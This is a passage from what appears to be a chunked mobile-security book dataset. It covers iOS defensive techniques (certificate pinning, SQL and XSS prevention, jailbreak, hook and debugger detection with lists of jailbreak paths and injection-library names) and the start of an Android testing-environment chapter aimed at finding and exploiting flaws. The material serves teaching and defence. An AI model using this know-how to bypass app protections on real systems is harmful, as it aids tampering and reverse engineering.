\\\nlength:(NSUInteger)size];\nNSString *file = [[NSBundle mainBundle] pathForResource:@\"mahh\"\\\nofType:@\"der\"];\nNSData* cert2 = [NSData dataWithContentsOfFile:file];\nif(nil == cert1 &boxV; nil == cert2)\nbreak; /* failed */\nconst BOOL equal = [cert1 isEqualToData:cert2];\nif(!equal)\nbreak; /* failed */\n// The only good exit point\nreturn [[challenge sender] useCredential: [NSURLCredential \\\ncredentialForTrust: serverTrust]\nforAuthenticationChallenge: challenge];\n} while(0);\n// Bad dog\nreturn [[challenge sender] cancelAuthenticationChallenge: \\\nchallenge];\n}\n}\nAvoiding Injection Vulnerabilities\nInsecurely developed iOS applications can be plagued with a variety of injection-style vulnerabilities, much the\nsame way as traditional web applications can. Injection vulnerabilities can occur any time an application accepts\nuser-controlled input; however, they most commonly manifest when a response is received from a server-side\napplication that contains tainted data. A simple example of this would be a social networking application that\nreads status updates of the user’s friends; in this instance the status updates should be regarded as potentially\ntainted data. This section details how to reliably avoid the two most common types of injection vulnerability:\nSQL injection and cross-site scripting (XSS).\nPreventing SQL Injection\nOne of the most common injection attacks is SQL injection, and those of you familiar with web application\ntesting will undoubtedly have knowledge of it. This type of attack can happen any time an application directly\npopulates tainted data into an SQL query and although the consequences within a mobile application are likely\nto be much less serious, you should take appropriate preventative measures.\nMuch like the recommendations for an SQL injection vulnerability in a web application, you can achieve reliable\navoidance using parameterized SQL queries in which you substitute placeholders for the strings you want to\npopulate to your query. By far the most popular database in use by iOS applications is SQLite. SQLite provides\nsqlite3_prepare, sqlite3_bind_text, and similar functions to parameterize your queries and bind the relevant\nvalues to your parameters. Consider the following example, which constructs a query, parameterizes it, and then\nbinds the user controller values to the query:\nNSString* safeInsert = @\"INSERT INTO messages(uid, message, username)\nVALUES(?, ?, ?)\";\nif(sqlite3_prepare(database, [safeInsert UTF8String], -1, &statement, NULL)\n!= SQLITE_OK)\n{\n// Unable to prepare statement\n}\nif(sqlite3_bind_text(statement, 2, [status.message UTF8String], -1,\nSQLITE_TRANSIENT) != SQLITE_OK)\n{\n// Unable to bind variabless\n}\nThis example shows how to bind the status.message variable to a text column in the query. To add the\nremaining variables, you would use similar code and the function appropriate to the type of column you want to\nbind to.\nAvoiding Cross-Site Scripting\nCross-site scripting (XSS) can occur any time that tainted data is populated into a UIWebView, and the\nconsequences can vary depending on how the web view is loaded, the permissions your application has, and\nwhether your application exposes additional functionality using a JavaScript to Objective-C bridge.\nA number of approaches can help you not only thwart cross-site scripting attacks, but also to minimize the\nimpact they can have if they do occur:\nBe aware of the origin you load your UIWebView from and always avoid loading it with the file:// protocol\nhandler.\nBe wary of populating tainted data into JavaScript strings and executing them in the web view. This problem\nis particularly common when using the UIWebView method stringByEvaluatingJavaScriptFromString.\nBe wary of dynamically constructing HTML for a UIWebView when using tainted data. Ensure appropriate\nsanitization and encoding takes place before loading your HTML into the web view. This problem is\nparticularly common when using the UIWebView method loadHTMLString.\nWhen working with HTML and XML you may need to dynamically populate potentially tainted data in to a web\nview. In these scenarios you can achieve some confidence that cross-site scripting has been avoided by encoding\nany data that you believe could be tainted. The following rules can be used to determine what and how specific\nmeta-characters can be encoded:\nLess than (<)—Replace with &lt everywhere\nGreater than (>)—Replace with &gt everywhere\nAmpersand (&)—Replace with &amp everywhere\nDouble quote (“)—Replace with &quot inside attribute values\nSingle quote (‘)—Replace with &apos inside attribute values\nSecuring Your Application with Binary Protections\nA relatively new consideration, binary protections were introduced in to the OWASP mobile top ten in January\n2014 and although their merit has come under some controversy, they can undoubtedly provide a means to slow\ndown your adversary. The term is used to generically describe the security controls that can be implemented\nwithin a mobile application. These protections attempt to achieve the following goals:\nPrevent a mobile application operating in an untrusted environment\nIncrease the complexity of exploitation of memory corruption\nThwart or increase the complexity of reverse engineering\nThwart or increase the complexity of modification or tampering attacks\nDetect attacks from on-device malware\nAccording to a research study by Hewlett-Packard in 2013 (http://www8.hp.com/us/en/hp-news/press-\nrelease.html?id=1528865#.U_tU4YC1bFO), 86% of the mobile applications that they reviewed lacked adequate\nbinary hardening. Applications failing to implement any form of binary protection are typically an easier target\nfor cybercriminals and can be more at risk of one or more of the following categories of attack:\nTheft of intellectual property from reverse engineering\nCircumvention of security controls such as local authentication, encryption, licensing, DRM, jailbreak\ndetection, and so on\nLoss of revenue from piracy\nBrand and/or reputation damage from application imitation and/or code modification attacks\nIf you have conducted mobile application security assessments on a regular basis, you have likely encountered\nsome binary protections. Improving your understanding of the defenses that you’re trying to break or attack will\nalways help you become a better attacker. In the subsequent sections we detail some of the protections that we\nhave encountered, assisted in developing, and in some cases had to circumvent. You should be aware that on\ntheir own all of these protections are trivial to bypass, even by attackers with a basic knowledge of reverse\nengineering. However, when combined and correctly implemented they can significantly increase the\ncomplexity of reverse engineering and attacks against your application.\nBefore delving in to this topic it is also important to stress that binary protections do not solve any underlying\nissues that an application might have and by no means should be used to plaster over any cracks that exist.\nBinary protections simply exist as a defense-in-depth control to slow down an attacker and perhaps shift them\non to a softer target.\nDetecting Jailbreaks\nPerhaps the most commonly implemented of the different binary protections, jailbreak detection attempts to\ndetermine whether the application is running on a jailbroken or otherwise-compromised device. If the detection\nmechanisms are triggered, the application will typically implement some form of reactive measures; common\nreactions include:\nWarning users and asking them to accept liability\nPreventing the application from running by gracefully exiting or crashing\nWiping any sensitive stored data on the device\nReporting home to a management server to achieve actions such as flagging the user as a fraud risk\nGracefully exiting the application or triggering a crash\nYou can use several techniques to perform jailbreak detection; however, be aware that these are often trivial to\nbypass unless other protections are also in place. At a high-level some of the common methods of detection that\nyou might encounter include:\nJailbreak artifacts\nNon-standard open ports\nWeakening of the sandbox\nEvidence of system modifications\nThe following sections cover these detection methods and provide brief sample implementations and proof of\nconcepts where applicable.\nJailbreak Artifacts\nWhen a device is jailbroken, this process will almost always leave an imprint on the filesystem: typically,\nartifacts that will be used by the user post-jailbreak or residual content from the jailbreak process itself.\nAttempting to find this content can often be used as a reliable means of determining the status of a device.\nTo achieve the best and most reliable results you use a mixture of file-handling routines, both from the SDK\nAPIs such as NSFileManager fileExistsAtPath and standard POSIX-like functions such as stat(). Using a\nmixture of functions to determine the presence of a file or directory means that you may still achieve some\nsuccess if your attacker is instrumenting only a subset of your functions. Where possible you should inline\nthese functions, which causes the compiler to embed the full body of the function rather than a function call;\ninlining means that your attacker must identify and patch each instance of your jailbreak detection.\nHere is a simple example of how to implement this:\ninline int checkPath(char * path) __attribute__((always_inline));\nint checkPath(char * path)\n{\nstruct stat buf;\nint exist = stat ( (path), &buf );\nif ( exist == 0 )\n{\nreturn 1;\n}\nreturn 0;\n};\nYou could leverage this example by passing it paths associated with a jailbreak; assuming no tampering has\noccurred, the function will return 1 if the file exists. Some common paths that you can use to identify the\npresence of a jailbreak/root are\n/bin/bash\n/usr/sbin/sshd\n/Applications/Cydia.app\n/private/var/lib/apt\n/pangueaxe\n/System/Library/LaunchDaemons/io.pangu.axe.untether.plist\n/Library/MobileSubstrate/MobileSubstrate.dylib\n/usr/libexec/sftp-server\n/private/var/stash\nTo avoid easy detection by reverse engineering, use encryption or obfuscation to disguise the paths that you\nvalidate.\nNondefault Open Ports\nMany users of jailbroken devices install remote access software to allow them to interactively access their\ndevice; this often causes a nondefault port to be opened on the device. The most popular software to achieve this\nis OpenSSH, which in its default configuration causes TCP port 22 to be opened on the device.\nYou can generally safely assume that if SSH or other non-default ports are open on a device that it may have\nbeen jailbroken. Therefore, an additional detection technique that you can employ is to scan the device’s\ninterfaces for nondefault ports, performing banner grabbing for additional confidence where necessary. A simple\nexample of how you might check the loopback interface to determine whether a given port is open is shown\nnext; again, in a production application, you may want to encrypt or obfuscate strings to mitigate against easy\nidentification through reverse engineering:\ninline int isPortOpen(short port) __attribute__((always_inline));\nint isPortOpen(short port)\n{\nstruct sockaddr_in addr;\nint sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);\nmemset(&addr, 0, sizeof(addr));\naddr.sin_family = AF_INET;\naddr.sin_port = htons(port);\nif (inet_pton(AF_INET, \"127.0.0.1\", &addr.sin_addr))\n{\nint result = connect(sock, (struct sockaddr *)&addr, \\\nsizeof(addr));\nif(result==0) {\nreturn 1;\n}\nclose(sock);\n}\nreturn 0;\n}\nWeakening of the Sandbox\nIt is well documented that many mobile devices sandbox applications to prevent interaction with other\napplications on the device and the wider OS. On iOS devices you may also find that jailbreaking your device\nweakens the sandbox in some way. As an application developer, testing the constraints of the sandbox may give\nyou some confidence as to whether the device has been jailbroken.\nAn example of sandbox behavior that differs between jailbroken and non-jailbroken devices is how the fork()\nfunction operates; on a non-jailbroken device it should always fail because third-party applications are not\nallowed to spawn a new process; however, on some jailbroken devices the fork()will succeed. You can use this\nbehavior to determine whether the sandbox has weakened and the device has been jailbroken. The following is a\nsimple example of how you can implement this:\ninline int checkSandbox() __attribute__((always_inline));\nint checkSandbox() {\nint result = fork();\nif (result >= 0) return 1;\nreturn 0;\n}\nIn some cases, applications installed through third-party application stores may also run with elevated (for\nexample, root) as opposed to the standard mobile user privileges. As such, the sandbox restrictions may not be\nin force and you can use an attempt to write to a file outside of the sandbox as a test case for determining the\nintegrity of the device. Here is a simple example of how to implement this:\ninline int checkWrites() __attribute__((always_inline));\nint checkWrites()\n{\nFILE *fp;\nfp = fopen(\"/private/shouldnotopen.txt\", \"w\");\nif(!fp) return 1;\nelse return 0;\n}\nEvidence of System Modifications\nOn iOS devices the disk is partitioned in a way such that the read-only system partition is often much smaller\nthan the data partition. Stock system applications reside on the system partition under the /Applications folder\nby default. However, as part of the jailbreaking process, many jailbreaks relocate this folder so that additional\napplications can be installed in it without consuming the limited disk space. This is typically achieved by\ncreating a symbolic link to replace the /Applications directory, and linking to a newly created directory within\nthe data partition. Modifying the filesystem in this manner provides an opportunity for you to look for further\nevidence of a jailbreak; if /Applications is a symbolic link as opposed to a directory you can be confident that\nthe device is jailbroken. A simple example of how to implement this check is shown next; you should call this\nfunction with the path you want to check (such as /Applications) as the argument:\ninline int checkSymLinks (char *path) __attribute__((always_inline));\nint checkSymLinks(char *path)\n{\nstruct stat s;\nif (lstat(path, &s) == 0)\n{\nif (S_ISLNK(s.st_mode) == 1)\nreturn 1;\n}\nreturn 0;\n}\nAside from /Applications, jailbreaks often create a number of other symbolic links that you should also validate\nfor further confidence.\nSecuring Your Application Runtime\nFrameworks such as Cydia Substrate (http://www.cydiasubstrate.com/) and Frida (http://www.frida.re/)\nmake instrumentation of mobile runtimes a relatively straightforward process and can often be leveraged to\nmodify application behavior and bypass security controls or to leak or steal sensitive data. In some cases they\nhave also been abused by malware that targets jailbroken devices as was the case with the “Unflod Baby Panda\nmalware” (https://www.sektioneins.de/en/blog/14-04-18-iOS-malware-campaign-unflod-baby-panda.html).\nInstrumentation leads to a situation whereby an application cannot always trust its own runtime. For a secure\napplication, additional validation of the runtime is recommended.\nThe typical approach for runtime hooking used by frameworks such as Cydia Substrate is to inject a dynamic\nlibrary into the address space of your application and replace the implementation of a method that the attacker\nwants to instrument. This typically leaves behind a trail that you can use to gain some confidence as to whether\nyour application is being instrumented. First, methods residing from within Apple SDKs will typically originate\nfrom a finite set of locations, specifically:\n/System/Library/TextInput\n/System/Library/Accessibility\n/System/Library/PrivateFrameworks/\n/System/Library/Frameworks/\n/usr/lib/\nFurthermore, methods internal to your application should reside from within your application binary itself. You\ncan verify the source location of a method using the dladdr() function, which takes a function pointer to the\nfunction that you want to retrieve information about. The following is a simple implementation that iterates a\ngiven class’ methods and checks the source location of the image against a set of known possible image\nlocations. Finally, it checks whether the function resides within a path relative to the application itself:\nint checkClassHooked(char * class_name)\n{\nchar imagepath[512];\nint n;\nDl_info info;\nid c = objc_lookUpClass(class_name);\nMethod * m = class_copyMethodList(c, &n);\nfor (int i=0; i<n; i++)\n{\nchar * methodname = sel_getName(method_getName(m[i]));\nvoid * methodimp = (void *) method_getImplementation(m[i]);\nint d = dladdr((const void*) methodimp, &info);\nif (!d) return YES;\nmemset(imagepath, 0x00, sizeof(imagepath));\nmemcpy(imagepath, info.dli_fname, 9);\nif (strcmp(imagepath, \"/usr/lib/\") == 0) continue;\nmemset(imagepath, 0x00, sizeof(imagepath));\nmemcpy(imagepath, info.dli_fname, 27);\nif (strcmp(imagepath, \"/System/Library/Frameworks/\") == 0) continue;\nmemset(imagepath, 0x00, sizeof(imagepath));\nmemcpy(imagepath, info.dli_fname, 34);\nif (strcmp(imagepath, \"/System/Library/PrivateFrameworks/\") == 0) \\\ncontinue;\nmemset(imagepath, 0x00, sizeof(imagepath));\nmemcpy(imagepath, info.dli_fname, 29);\nif (strcmp(imagepath, \"/System/Library/Accessibility\") == 0) \\\ncontinue;\nmemset(imagepath, 0x00, sizeof(imagepath));\nmemcpy(imagepath, info.dli_fname, 25);\nif (strcmp(imagepath, \"/System/Library/TextInput\") == 0) continue;\n// check image name against the apps image location\nif (strcmp(info.dli_fname, image_name) == 0) continue;\nreturn YES;\n}\nreturn NO;\n}\nWhen using this implementation in an application, you should obfuscate or encrypt the image paths to prevent\neasy identification from reverse engineering.\nAs previously noted, when the aforementioned frameworks are used to modify an application, they inject a\ndynamic library into the application’s address space. Scanning your application’s address space and retrieving\nthe list of currently loaded modules is therefore also possible; scanning each of these modules for known\nsignatures or image names can help you determine whether a library has been injected. Consider the following\nsimple example that iterates the list of currently loaded images, retrieves the image name using\n_dyld_get_image_name(), and looks for substrings of known injection libraries:\ninline void scanForInjection() __attribute__((always_inline));\nvoid scanForInjection()\n{\nuint32_t count = _dyld_image_count();\nchar* evilLibs[] =\n{\n\"Substrate\", \"cycript\"\n};\nfor(uint32_t i = 0; i < count; i++)\n{\nconst char *dyld = _dyld_get_image_name(i);\nint slength = strlen(dyld);\nint j;\nfor(j = slength - 1; j>= 0; --j)\nif(dyld[j] == '/') break;\nchar *name = strndup(dyld + ++j, slength - j);\nfor(int x=0; x < sizeof(evilLibs) / sizeof(char*); x++)\n{\nif(strstr(name, evilLibs[x]) ǁ strstr(dyld, evilLibs[x]))\nfprintf(stderr,\"Found injected library matching string: \\\n%s\", evilLibs[x]);\n}\nfree(name);\n}\n}\nAnother interesting technique for identifying hooking is to examine how hooks operate at a low level and\nattempt to locate similar signatures in your application. As an example, consider a simple hook that has been\nplaced on the fork() function; first retrieve the address of the fork() function:\nNSLog(@\"Address of fork = %p\", &fork);\nThis should print something similar to the following in the console log:\n2014-09-25 19:09:28.619 HookMe[977:60b] Address of fork = 0x3900b7a5\nThen run your application and examine the disassembly of the function without the hook in place (truncated for\nbrevity):\n(lldb) disassemble -a 0x3900b7a5\nlibsystem_c.dylib'fork:\n0x3900b7a4: push {r4, r5, r7, lr}\n0x3900b7a6: movw r5, #0xe86c\n0x3900b7aa: add r7, sp, #0x8\n0x3900b7ac: movt r5, #0x1d0\n0x3900b7b0: add r5, pc\n0x3900b7b2: ldr r0, [r5]\n0x3900b7b4: blx r0\n0x3900b7b6: blx 0x39049820\nRepeating these steps again shows a different result when the fork()function is being hooked:\n(lldb) disassemble -a 0x3900b7a5\nlibsystem_c.dylib'fork:\n0x3900b7a4: bx pc\n0x3900b7a6: mov r8, r8\n0x3900b7a8: .long 0xe51ff004\n0x3900b7ac: bkpt #0x79\n0x3900b7ae: lsls r5, r1, #0x6\n0x3900b7b0: add r5, pc\n0x3900b7b2: ldr r0, [r5]\n0x3900b7b4: blx r0\nAs you can see, the opcode signature is entirely different. This can be attributed to the trampoline that is\ninserted at 0x3900b7a8 by the Cydia Substrate framework. In assembly, the opcode 0xe51ff004 equates to the\nldr pc, [pc-4] instruction that causes the application to jump to the location pointed to by the next word after\nthe current value of the pc register, in this case 0x018dbe79.\nUsing this information you can now write a short routine to detect trampolines in your functions before you call\nthem, and as a consequence, determine whether it is being hooked. This is demonstrated in the following simple\nexample:\ninline int checkFunctionHook() __attribute__((always_inline));\nint checkFunctionHook(void * funcptr)\n{\nunsigned int * funcaddr = (unsigned int *) funcptr;\nif (funcptr) {\nif (funcaddr[0] == 0xe51ff004) return 1;\n}\nreturn 0;\n}\nNote that additional checks may be required depending on the architecture that your application is running\nunder. You can also use similar techniques to detect hooking of native code on the Android platform.\nTamperproofing Your Application\nThe tamperproofing protection mechanism is not widely deployed but can typically be found in applications that\nhave the most sensitive operating environments. Integrity validation attempts to ensure that static application\nresources such as HTML files or shared libraries, as well as internal code structures, have not been modified.\nFrom a native code perspective, this protection specifically looks to thwart attackers that have “patched” the\nassembly for your application.\nIntegrity validation is often implemented using checksums, with CRC32 being a popular choice due to its speed\nand simplicity. To validate static application resources such as HTML or shared library files the developer would\ncalculate a checksum for each resource (or indeed all resources combined) and embed it in the application along\nwith a validation routine to recalculate and compare the stored checksum periodically during the application’s\nruntime. Similarly, to validate internal code structures, the application must have some means of calculating the\nstored checksum.\nImplementing such protections without external resources (such as the compiler or Mach-O/ELF modification\ntools) typically means running the application and allowing it to self-generate a checksum of a function or set or\nfunctions, then manually embedding the calculated checksum into the binary. You can achieve some success\nwith this method when you manually embed a “web” of checksum validation routines but it has a number of\ndrawbacks—primarily the inability to automatically randomize the protection across builds as well as the\nmanual efforts required to implement and maintain it.\nA more complex but significantly better approach is to use the power of the low-level virtual machine (LLVM)\ncompiler and allow native code within iOS and Android applications to be self-validating. Using this approach\nyou can create an optimization pass that leverages LLVM’s JIT compiler to programmatically compile and\nmodify the LLVM bytecode. This strategy allows you to automatically calculate a checksum for your JIT-\ncompiled function and insert validation routines across the binary during the application’s compilation process,\nwithout any modification to the code.\nYou should be aware that although integrity validation is a power protection mechanism, ultimately a\nknowledgeable adversary could always bypass it because all the validation routines occur within the binary\nitself. In the event that your checksum calculation functions can be easily identified—for example, through a\nspecific signature or via cross references—the attacker could simply patch out your routines to leave the\napplication unprotected.\nImplementing Anti-Debugging Protections\nDebugging is a popular technique used when reverse engineering mobile applications. It provides an insight into\nthe internal workings of an application and allows an attacker to modify control flow or internal code structures\nto influence application behavior. This can have significant consequences for a security-conscious application;\nsome example use cases where debugging might be applied are to extract cryptographic key material from an\napplication, manipulate an application’s runtime by invoking methods on existing objects, or to understand the\nsignificance of an attacker-generated fault.\nAlthough preventing a privileged attacker from debugging your application is conceptually impossible, you can\ntake some measures to increase the complexity and time required for an attacker to achieve debugging results.\nOn iOS, debugging is usually achieved using the ptrace() system call. However, you can call this function from\nwithin your third-party application and provide a specific operation that tells the system to prevent tracing from\na debugger. If the process is currently being traced then it will exit with the ENOTSUP status. As mentioned, this is\nunlikely to thwart a skilled adversary but does provide an additional hurdle to overcome. The following is a\nsimple implementation of this technique. You should implement it not only throughout your application but\nalso as close to the process start (such as in the main function or a constructor) as possible:\ninline void denyPtrace () __attribute__((always_inline));\nvoid denyPtrace()\n{\nptrace_ptr_t ptrace_ptr = dlsym(RTLD_SELF, \"ptrace\");\nptrace_ptr(PT_DENY_ATTACH, 0, 0, 0);\n}\nYou may also want to implement a secondary measure of detecting whether your application is being debugged\nto add further resilience in the event that your PT_DENY_ATTACH operation has been overcome. To detect whether\na debugger is attached to your application you can use the sysctl() function. This doesn’t explicitly prevent a\ndebugger from being attached to your application but returns sufficient information about your process to allow\nyou to determine whether it is being debugged. When invoked with the appropriate arguments, the sysctl()\nfunction returns a structure with a kp_proc.p_flag flag that indicates the status of the process and whether or\nnot it is being debugged. The following is a simple example of how to implement this:\ninline int checkDebugger () __attribute__((always_inline));\nint checkDebugger()\n{\nint name[4];\nstruct kinfo_proc info;\nsize_t info_size = sizeof(info);\ninfo.kp_proc.p_flag = 0;\nname[0] = CTL_KERN;\nname[1] = KERN_PROC;\nname[2] = KERN_PROC_PID;\nname[3] = getpid();\nif (sysctl(name, 4, &info, &info_size, NULL, 0) == -1) {\nreturn 1;\n}\nreturn ((info.kp_proc.p_flag & P_TRACED) != 0);\n}\nThese are just a few examples of strategies that exist for debugger detection; many others exist. Indeed, there is\nscope to be quite creative using more convoluted strategies such as execution timing, where you record the\namount of time it takes to complete a set of operations and if it’s outside a margin of acceptable execution times\nyou can have some assurance that your application is being debugged.\nObfuscating Your Application\nIn its simplest definition obfuscation is a technique used to complicate reverse engineering by making code\ncomplex to understand. This principle is well understood throughout computer science and the topic is far\nbeyond the scope of this book; indeed, whole research projects have been dedicated to this topic alone. Instead,\nwe focus on how it is relevant to mobile applications and how you can apply it to iOS applications.\nIt is common knowledge that without obfuscation Objective-C is relatively simple to reverse engineer. As you\nhave already discovered from Chapter 2, retrieving class, method, and variable names from the OBJC segment of\na Mach-O binary is possible. This fact can be a thorn in the side of any developer who wants to protect his\nintellectual property, and therefore obfuscation is often used to disguise the operations of an application\nwithout entirely modifying the expected outcomes. At a high level, some of the techniques used by obfuscators\ninclude:\nObscuring class, field, and method names\nInserting bogus code\nModifying the control flow\nUsing string encryption\nSubstituting code to make it appear more complex; for example, using reflection\nFlattening control flow\nFew options exist for obfuscating native code, with the exception of the Obfuscator-LLVM project, which can be\nused to obfuscate the Android NDK or iOS applications using an LLVM compiler optimization pass. Obfuscator-\nLLVM implements obfuscation passes using the following techniques:\nInstructions substitution (–mllvm –sub)\nBogus control flow (–mllvm –bcf)\nControl flow flattening (–mllvm –fla)\nTo use Obfuscator-LLVM within Xcode you must first create an Xcode plugin to reference the new compiler. For\ninstructions on how to perform this and build the project, you should refer to the O-LLVM wiki\n(https://github.com/obfuscator-llvm/obfuscator/wiki/Installation).\nUnfortunately, while Obfuscator-LLVM is an extremely useful obfuscator, it lacks the functionality to obfuscate\nclass and method names. However, an alternative solution can work in harmony with Obfuscator-LLVM and\ntogether can make a relatively formidable obfuscator: iOS Class Guard works as an extension for the popular\nclass-dump tool and works by parsing your binary to generate an obfuscated symbol table that you can use in\nfuture builds. For details on how to implement iOS Class Guard in your application, you should refer to the wiki\n(https://github.com/Polidea/ios-class-guard).\nSummary\nSecuring an iOS application can be a relatively daunting task even for seasoned developers due to the large\nnumber of considerations and possible attack surfaces. Within this chapter you have learned how to secure your\napplication data not only at rest but also in transit, as well as securely erase it when it is no longer in use.\nFurthermore, you learned how to implement a variety of binary protections that can be used to not only\ndecrease the pool of adversaries capable of attacking your application, but also increase the amount of time\nneeded to attack it. No silver bullet exists for securing an application, but with sufficient effort, building a self-\ndefending application that cannot be easily tampered with is possible. You should also be aware that when\nsecuring an application using binary protections, you are not solving any vulnerabilities that your application\nmight have. Indeed particular care should be given to ensure that these protections do not mask any issues that\nmay have been identified without them.",
    "question": "What are the key strategies for securing data in an iOS application, both at rest and in transit, and how can developers implement effective binary protections to prevent tampering and reverse engineering?",
    "summary": "This chapter discusses how to secure iOS applications by protecting data at rest and in transit, avoiding injection attacks, and implementing binary protections. It emphasizes the importance of using established encryption algorithms and techniques to safeguard sensitive information. Additionally, it covers methods for detecting jailbreaks, debugging, and obfuscation to make the application more resilient to attacks."
  },
  {
    "start": 31,
    "end": 32,
    "text": "CHAPTER 6\nAnalyzing Android Applications\nThe Android Operating System (OS) is used by many vendors on phones and tablets ranging from low-cost\nbudget devices to flagships. Due to its open-source nature it can be found on many other devices including\nentertainment systems, TVs, e-readers, netbooks, smartwatches, car computers, and gaming consoles.\nAndroid is the mobile platform that has the biggest market share out of all the mobile operating systems\navailable. With this esteemed achievement comes the attention of many hackers around the world wanting to\nexpose security flaws in the OS and popular applications on the platform. Although many app stores are\navailable for Android users, observing only the official Google Play Store statistics from AppBrain\n(http://www.appbrain.com/stats/number-of-android-apps) reveals that Google Play Store holds more than 1.1\nmillion applications for download. Vulnerabilities are constantly being discovered in popular applications with\nvarying degrees of severity, and due to the maturity of tools and information about finding these vulnerabilities,\nthis trend looks to be ever increasing.\nThis chapter presents some fundamental concepts of Android including its application structure, security model,\nand infrastructure central to its operation. It also delves deeper into the intricacies of the Android platform and\nways that you can explore these by setting up a testing environment and making use of popular tools. The goal\nof this chapter is to provide you with the background knowledge required to find and exploit security flaws in\napplications.\nCreating Your First Android Environment\nThe first step in building your ideal testing environment is downloading the Android Software Development Kit\n(SDK). Whether you plan to use an emulator or physical device, the Android SDK provides many tools that are\nessential to getting started with Android hacking. You can download the SDK tools from\nhttp://developer.android.com/sdk/ for your OS. The two options are to download the entire Android\nDeveloper Tools package, which includes an integrated development environment (IDE) and all the tools, or\ndownload an archive containing only the tools. For the large majority of testing, having only the tools and not a\nfull development environment setup should suffice. However, occasionally you may still have to write a custom\napplication to test a certain condition or create a proof of concept. We highly recommended using Linux as your\nbase OS when testing Android because many of the tools that you will be experimenting with in subsequent\nchapters were originally written for Linux, and have shown to be less error-prone on Linux. However, you can\nignore our bias and use other operating systems successfully. If you are new to Linux, it is recommended that\nyou use the Ubuntu distribution (see http://www.ubuntu.com/). This is because of the wealth of information\nand tutorials available for newcomers.\nAfter extracting the SDK tools, place the entire tools/ directory on your path. In Linux, you do so by adding the\nfollowing line to your .bashrc in your home folder and then opening a new terminal:\nexport PATH=$PATH:/path/to/sdk/tools/:/path/to/sdk/platform-tools/\nThis command appends the provided folders to your path. Some hackers prefer to create symbolic links to\nspecific binaries in a directory that is already in their path (like /usr/local/bin), which you can do as follows:\n# cd /usr/local/bin\n# ln –s /path/to/binary\nThe following is a shortened listing of Android SDK tools to get you started:\nadb—The tool that is used most to interact with devices and emulators to install new applications, gain a\nshell on the system, read system logs, forward network ports, or do a multitude of other useful tasks.\nmonitor—This tool is useful for peeking into running processes on a device and taking screenshots of the\ndevice’s screen. It is useful for penetration testers who need to gain evidence of an action for reporting\npurposes.\nandroid—You use this tool to manage and create new Android emulators.\naapt—This tool converts assets into binary form to be packaged with applications. It can also perform\nreverse-engineering tasks that allow someone with only the compiled application package to convert binary\napplication resources into readable text.\nNOTE\nYou will need to have Java JDK 1.6 installed to use the SDK tools. On a clean Ubuntu system, you can\ninstall OpenJDK using\n$ sudo apt-get install openjdk-6-jdk\nA 64-bit system requires an additional installation of 32-bit packages needed by the SDK tools. You can install\nthese on Ubuntu 13.04 upward by using\n$ sudo dpkg –add-architecture i386\n$ sudo apt-get update\n$ sudo apt-get install libncurses5:i386 libstdc++6:i386 zlib1g:i386\nPrior to that version of Ubuntu, you use the following command:\n$ sudo apt-get install ia32-libs\nAndroid provides an excellent set of emulators for all versions from the most current all the way back to\nAndroid 1.5. To create your very first Android emulator that runs Android 4.4.2 KitKat, run the following to\ndisplay the Android SDK Manager interface:\n$ android sdk\nYou can use this to install SDK platforms, system images, and tools. Figure 6.1 shows the user interface.\nFigure 6.1 From this Android SDK Manager interface you can install SDK platforms and tools.\nSelect Android 4.4.2 (API 19), click Install, and agree to the user license. It will now download and install all\nrequired packages. You are now able to create a KitKat emulator by running the Android Virtual Device (AVD)\nManager:\n$ android avd\nOn the AVD Manager’s user interface, click the New button. The configuration in Figure 6.2 is fit for most\npurposes but you can customize it to suit a particular testing requirement.\nFigure 6.2 You can customize your emulator configuration. Here is just one example.\nYour emulator should now be created. You can start it by clicking the Start button on the AVD manager or\nrunning the following from a terminal if you know the name of your created AVD:\n$ emulator -avd kitkat\nAfter the emulator launches, list all connected Android devices on your computer by using one of the included\nSDK tools named ADB (Android Debug Bridge):\n$ adb devices\nTo get an interactive shell on the listed device issue the following command:\n$ adb -s device_id shell\nIf only a single device is connected, you can omit the -s parameter. If you have only a single emulator open and\na connected physical device, you can also omit the -s parameter and use -e (emulator) and -d (device) to\ninteract with each, respectively. ADB will be used for a number of tasks on Android, and we advise you to take\nthe time to learn all of its functionality and syntax.\nYou might immediately notice some minor differences between an actual device and an emulator, such as\nEmulators provide root access by default whereas actual devices do not. The exact way in which Android\ndetermines the privilege level of ADB is through a configuration option named ro.secure which will be\nexplored in Chapter 8.\nEmulators do not operate correctly for certain applications that make use of physical hardware, such as USB,\nheadphones, Wi-Fi, Bluetooth, and so on.\nYou are not able to place or receive real phone calls on an emulator. However, an interface exists that allows\nyou to emulate this to a degree.\nEmulator restrictions are documented at\nhttp://developer.android.com/tools/devices/emulator.html#limitations. When performing testing on an\nAndroid application, you should have multiple devices at hand in addition to the emulators to accommodate for\nthe differences between them.\nThe Android emulator provides a way for users to emulate a number of events, such as receiving an SMS or\nphone call through a console interface. Locate the console by observing the output of adb devices in the\nprevious command. For example, an emulator named emulator-5554 indicates that it has a listening port on\nTCP 5554 on the local host. Use a telnet or netcat (nc) client to access the console interface. Most Linux\ndistributions come with nc, which you use to access the console interface as follows:\n$ nc localhost 5554\nAndroid Console: type 'help' for a list of commands\nOK\nhelp\nAndroid console command help:\nhelp|h|? print a list of commands\nevent simulate hardware events\ngeo Geo-location commands\ngsm GSM related commands\ncdma CDMA related commands\nkill kill the emulator instance\nnetwork manage network settings\npower power related commands\nquit|exit quit control session\nredir manage port redirections\nsms SMS related commands\navd control virtual device execution\nwindow manage emulator window\nqemu QEMU-specific commands\nsensor manage emulator sensors\nSome other more technical differences between the Android emulator and physical devices are not so apparent\non first observation. Writing an exploit for a memory corruption vulnerability will quickly reveal these\ndifferences. Exploitation at this level is an advanced topic that would require a separate publication on its own.\nHowever, all that is important is that you realize that at the lowest levels of operation, an emulator is not an\nexact replica of how Android runs on a real device, even though it may feel that way. Often, exploits that work\non an emulator may require significant changes to work on an actual device.\nAlternatives other than using the emulator that comes with the Android SDK are available. Popular ones include\nGenymotion (http://www.genymotion.com/)\nVirtualbox running Android x86 (http://www.android-x86.org/)\nYouwave (https://youwave.com)\nWindowsAndroid (http://windowsandroid.en.softonic.com/)\nThese emulators run x86 versions of Android and some applications that contain native code may not support\nthis architecture. However, for exploring Android to understand how it works, they are useful and some may run\nquicker than the Google emulators. However, it is still the author’s preference to use the official Android\nemulator as it is always guaranteed to be unmodified.\nFor testing purposes, using a physical Android device may be better than using an emulator because of emulator\nspeed issues or hardware requirements such as Wi-Fi or Bluetooth. As opposed to other mobile platforms where\njailbreaking your testing device is essential, you can do a surprising amount of testing or hacking without root\naccess on an Android device. However, some actions cannot be performed or take longer to perform without\nhaving root access on 